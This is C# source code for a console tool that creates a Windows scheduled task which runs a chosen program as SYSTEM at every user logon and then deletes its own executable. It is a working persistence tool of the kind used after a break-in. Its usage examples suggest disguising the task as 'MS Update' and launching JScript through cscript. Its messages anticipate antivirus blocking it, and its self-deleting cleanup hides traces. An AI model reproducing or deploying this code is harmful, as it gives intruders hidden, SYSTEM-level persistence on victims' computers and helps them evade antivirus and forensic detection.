using Microsoft.Win32.TaskScheduler;
using System;
using System.Diagnostics;
using System.IO;

namespace TaskSchedulerWrapper
{
    class Program
    {
        static void Main(string[] args)
        {
            logo();
            string taskname = null;
            string parameter = null;
            string path = null;
            if (args.Length > 0)
            {
                foreach (var arg in args)
                {
                    string userQue = arg.Split('=')[0].Trim();
                    string userAns = arg.Split('=')[1].Trim();
                    switch (userQue)
                    {
                        case "--taskname":
                            taskname = userAns;
                            break;
                        case "--arg":
                            parameter = userAns;
                            break;
                        case "--path":
                            path = userAns;
                            break;
                    }
                }

                if (path != null && taskname != null)
                {
                    path = Path.GetFullPath(path);
                    if (File.Exists(path) == true)
                    {
                        if (!GetExists(taskname))
                        {
                            Console.WriteLine("任务计划不存在，正在添加...");
                            CreateTask(path, taskname, parameter);
                            Console.WriteLine("添加完毕，正在验证是否存在...");
                            if (GetExists(taskname))
                            {
                                Console.WriteLine("验证成功，退出线程。");
                            }
                            else
                            {
                                Console.WriteLine("验证失败，可能被杀毒拦截，退出线程。");
                            }
                        }
                        else
                        {
                            Console.WriteLine("计划任务已存在，尝试删除计划任务...");
                            DeleteTask(taskname);
                            if (GetExists(taskname))
                            {
                                Console.WriteLine("删除失败，退出线程。");
                            }
                            else
                            {
                                Console.WriteLine("删除成功，正在添加...");
                                CreateTask(path, taskname, parameter);
                                Console.WriteLine("添加完毕，正在验证是否存在...");
                                if (GetExists(taskname))
                                {
                                    Console.WriteLine("验证成功，退出线程。");
                                }
                                else
                                {
                                    Console.WriteLine("验证失败，可能被杀毒拦截，退出线程。");
                                }
                            }
                        }
                        killMe();
                    }
                    else
                    {
                        Console.Write("文件不存在或路径不合法，退出线程。");
                    }
                }
                else
                {
                    Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"Executable File\" --arg=\"Arguments\"(Optional) --taskname=\"TaskScheduler name\"");
                    Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"cscript.exe\" --arg=\"/E:Jscript 123.js\" --taskname=\"MS Update\"");
                    Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"file.exe\" --taskname=\"MS Update\"");
                }
            }
            else
            {
                Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"Executable File\" --arg=\"Arguments\"(Optional) --taskname=\"TaskScheduler name\"");
                Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"cscript.exe\" --arg=\"/E:Jscript 123.js\" --taskname=\"MS Update\"");
                Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"file.exe\" --taskname=\"MS Update\"");
            }
        }
        static bool GetExists(string taskName)
        {
            var exists = false;
            TaskService ts = new TaskService();
            TaskCollection tc = ts.RootFolder.GetTasks();
            if (tc.Exists(taskName))
            {
                exists = true;
            }
            return exists;
        }
        static void CreateTask(string Path, string taskName, string arg = "")
        {
            TaskService ts = new TaskService();
            TaskDefinition td = ts.NewTask();
            td.RegistrationInfo.Author = "WDST";
            td.RegistrationInfo.Description = "";
            td.Triggers.Add(new LogonTrigger { });
            td.Actions.Add(new ExecAction(Path, arg, null));
            td.Settings.DisallowStartIfOnBatteries = false;
            td.Settings.RunOnlyIfIdle = false;
            ts.RootFolder.RegisterTaskDefinition(taskName, td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount).Run();
        }
        static void DeleteTask(string taskName)
        {
            TaskService ts = new TaskService();
            ts.RootFolder.DeleteTask(taskName);
        }

        static void killMe()
        {
            string s = Process.GetCurrentProcess().MainModule.FileName;
            Process CmdProcess = new Process();
            CmdProcess.StartInfo.FileName = "cmd.exe";
            CmdProcess.StartInfo.CreateNoWindow = true;
            CmdProcess.StartInfo.UseShellExecute = false;
            CmdProcess.StartInfo.RedirectStandardInput = true;
            CmdProcess.StartInfo.RedirectStandardOutput = true;
            CmdProcess.StartInfo.RedirectStandardError = true;
            CmdProcess.StartInfo.Arguments = "/c ping -n 1 localhost 1>nul & del " + "\"" + s + "\"";
            CmdProcess.Start();
            CmdProcess.Close();
            Process.GetCurrentProcess().Kill();
        }

        static void logo()
        {
            Console.WriteLine(@"  _____        _    ___     _           _      _         ");
            Console.WriteLine(@" |_   _|_ _ __| |__/ __| __| |_  ___ __| |_  _| |___ _ _ ");
            Console.WriteLine(@"   | |/ _` (_-< / /\__ \/ _| ' \/ -_) _` | || | / -_) '_|");
            Console.WriteLine(@"   |_|\__,_/__/_\_\|___/\__|_||_\___\__,_|\_,_|_\___|_|  ");
            Console.WriteLine();
        }
    }
}
